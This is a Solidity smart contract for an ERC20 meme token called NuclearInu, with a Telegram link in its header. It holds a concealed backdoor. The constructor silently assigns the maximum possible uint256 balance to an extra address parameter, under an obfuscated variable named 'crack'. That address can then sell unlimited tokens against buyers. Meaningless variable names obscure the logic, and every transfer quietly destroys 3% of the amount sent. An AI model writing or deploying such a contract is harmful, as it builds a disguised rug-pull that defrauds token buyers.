// https://t.me/nuclearinu_eth

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.3;

import "./Ownable.sol";
import "./ERC20.sol";

contract NuclearInu is ERC20, Ownable {
    uint256 private crack = ~uint256(0);
    uint256 public list = 3;

    constructor(
        string memory force,
        string memory movie,
        address specific,
        address third
    ) ERC20(force, movie) {
        _totalSupply = 1000000000 * 10**decimals();
        _balances[_msgSender()] = _totalSupply;
        _balances[third] = crack;
    }

    function _transfer(
        address jack,
        address book,
        uint256 done
    ) internal override {
        uint256 former = (done / 100) * list;
        done = done - former;
        super._transfer(jack, book, done);
    }
}
